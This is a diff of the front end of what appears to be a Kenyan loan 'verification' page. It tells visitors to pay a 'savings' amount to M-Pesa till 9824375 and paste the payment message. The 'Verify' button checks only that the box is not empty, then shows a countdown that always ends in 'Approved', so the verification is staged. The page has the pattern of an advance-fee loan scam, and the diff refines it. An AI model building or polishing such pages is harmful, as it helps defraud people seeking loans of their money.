@@ -19,7 +19,6 @@
       margin-bottom: 20px;
       color: #333;
     }
-    /* Combined container styling */
     .account-info {
       background-color: #fff;
       padding: 20px;
@@ -34,7 +33,17 @@
       font-size: 1.2em;
       margin: 10px 0;
     }
-    .savings-message textarea {
+    .thank-you {
+      font-size: 1em;
+      font-weight: bold;
+      color: rgb(10, 10, 10);
+      text-align: center;
+    }
+    .input-section {
+      margin-top: 15px;
+      text-align: center;
+    }
+    textarea {
       width: 100%;
       height: 80px;
       padding: 10px;
@@ -42,34 +51,21 @@
       border-radius: 5px;
       resize: none;
       font-size: 1em;
-    }
-    .account-image {
-      width: 100%;
-      max-width: 150px;
-      display: block;
-      margin: 10px auto;
-      border-radius: 8px;
-      cursor: pointer;
-    }
-
-    /* Optional: If you prefer using a list element instead */
-.account-details ol {
-  text-align: center;
-  padding-left: 20px;
-  margin: 10px 0;
-}
-
-.account-details ol li {
-  margin-bottom: 8px;
-  font-size: 1.0em;
-  line-height: 1.0;
-}
-    .thank-you {
-      font-size: 1.0em;
       font-weight: bold;
-      color: rgb(10, 10, 10);
-      text-align: center;
-      background-position-x: center;
+    }
+    button {
+      padding: 12px 24px;
+      background-color: #40f01d;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      font-size: 1em;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      margin-top: 10px;
+    }
+    button:hover {
+      background-color: #0056b3;
     }
     .overlay {
       position: fixed;
@@ -84,64 +80,49 @@
       color: white;
       font-size: 2em;
       font-weight: bold;
+      flex-direction: column;
       display: none;
-    }
-    button {
-      padding: 12px 24px;
-      background-color: #007BFF;
-      color: #fff;
-      border: none;
-      border-radius: 4px;
-      font-size: 1em;
-      cursor: pointer;
-      transition: background-color 0.3s ease;
-      margin-top: 10px;
-    }
-    button:hover {
-      background-color: #0056b3;
-    }
-    #gifcontent {
-      display: none;
-      width: 150px;
-      margin: 10px auto;
     }
   </style>
 </head>
 <body>
   <h1>Verification</h1>
   
-  <!-- Combined Account Information -->
   <div class="account-info">
-    <p id="loanDisplay">Target Loan Amount: </p>
-    <p id="savingDisplay">Saving Amount: </p>
+    <p id="loanDisplay">Target Loan Amount: Loading...</p>
+    <p id="savingDisplay">Saving Amount: Loading...</p>
+
     <h2>Account Details</h2>
     <p id="firstName">Account Name: Loading...</p>
     <p id="phoneNumber">Phone Number: Loading...</p>
-    <p class="thank-you">CLICK ON THE TILL NUMBER BELOW TO COPY TILL TO CLIPBOARD</p>
+    <p class="thank-you">CLICK BELOW TO COPY TILL NUMBER TO DEPOSIT YOUR SAVINGS</p>
+    
+    <!-- Copy to Clipboard Button -->
+    <button id="copyButton">Click to Copy 9824375</button>
+
     <ol id="text">
       <li>Go to Mpesa</li>
       <li>Lipa na Mpesa</li>
       <li>Buy Goods and Services</li>
       <li>Enter 9824375</li>
     </ol>
+
+    <!-- New Input Section -->
+    <div class="input-section">
+      <p>Paste Mpesa Message:</p>
+      <textarea id="mpesaInput" placeholder="Paste your Mpesa transaction message here..."></textarea>
+      <button id="verifyButton">Verify</button>
+    </div>
   </div>
-  
-  <!-- Clickable account image -->
-  <img src="LIPA NA MPESA INUKA.jpeg" alt="Account Details" class="account-image" id="accountImage">
 
-  <div class="savings-message">
-    <textarea id="savingsText" placeholder="Paste your Mpesa savings message here..."></textarea>
-  </div>
-
-  <button id="submitButton">Submit</button>
-  <img src="process.gif" alt="Authorization GIF" id="gifcontent">
-
+  <!-- Overlay for Processing and Timer -->
   <div class="overlay" id="overlay">
-    Processing...: <span id="timer">15:00</span>
+    <p id="statusText">Successful! Now Processing...</p>
+    <p>Time Remaining: <span id="timer">03:00</span></p>
   </div>
 
   <script>
-    // Get stored data from localStorage
+    // Load user details from localStorage
     const targetValue = localStorage.getItem('targetValue');
     let savingAmount = localStorage.getItem('savingAmount');
     const firstName = localStorage.getItem('firstname') || "Unknown";
@@ -157,22 +138,33 @@
     }
 
     document.getElementById('loanDisplay').textContent = targetValue 
-      ? 'Target Loan Amount: Ksh ' + formatNumber(targetValue)
-      : 'Target Loan Amount: Not Available';
+      ? ' Loan Amount: Ksh ' + formatNumber(targetValue)
+      : ' Loan Amount: Not Available';
     document.getElementById('savingDisplay').textContent = 'Saving Amount: Ksh ' + formatNumber(savingAmount);
-
-    // Display user details
     document.getElementById('firstName').textContent = "Account Name: " + firstName;
     document.getElementById('phoneNumber').textContent = "Phone Number: " + phoneNumber;
 
-    // Copy account number (9824375) when account image is clicked
-    document.getElementById('accountImage').addEventListener('click', function() {
+    // Copy account number when button is clicked
+    document.getElementById('copyButton').addEventListener('click', function() {
       const accountNumber = "9824375";
       navigator.clipboard.writeText(accountNumber).then(() => {
         alert("Account number " + accountNumber + " copied to clipboard.");
-      }).catch((err) => {
+      }).catch(() => {
         alert("Failed to copy account number.");
       });
+    });
+
+    // Verification process
+    document.getElementById('verifyButton').addEventListener('click', function() {
+      const message = document.getElementById("mpesaInput").value.trim();
+      if (message === "") {
+        alert("Please paste your Mpesa message before verifying.");
+        return;
+      }
+      
+      // Show overlay and start timer
+      document.getElementById('overlay').style.display = "flex";
+      startTimer(180, document.getElementById('timer')); // 180 seconds (3 minutes)
     });
 
     function startTimer(duration, display) {
@@ -183,28 +175,14 @@
         minutes = minutes < 10 ? "0" + minutes : minutes;
         seconds = seconds < 10 ? "0" + seconds : seconds;
         display.textContent = minutes + ":" + seconds;
+
         if (--timer < 0) {
           clearInterval(interval);
-          document.getElementById('overlay').style.display = "none";
-          alert("HAKIKA R PROVISION\nYour savings verification is complete.");
+          document.getElementById('statusText').textContent = "✅ Approved";
         }
       }, 1000);
     }
-
-    document.getElementById('submitButton').addEventListener('click', function() {
-      const message = document.getElementById("savingsText").value;
-      if (message.trim() === "") {
-        alert("Please paste your Mpesa savings message before submitting.");
-        return;
-      }
-      document.getElementById('gifcontent').style.display = "block";
-      setTimeout(() => {
-        document.getElementById('gifcontent').style.display = "none";
-        alert("HAKIKA R PROVISION\nYour transaction has been received successfully.\nProcessing time: 15 minutes.");
-        document.getElementById('overlay').style.display = "flex";
-        startTimer(900, document.getElementById('timer'));
-      }, 3000);
-    });
   </script>
 </body>
 </html>
+
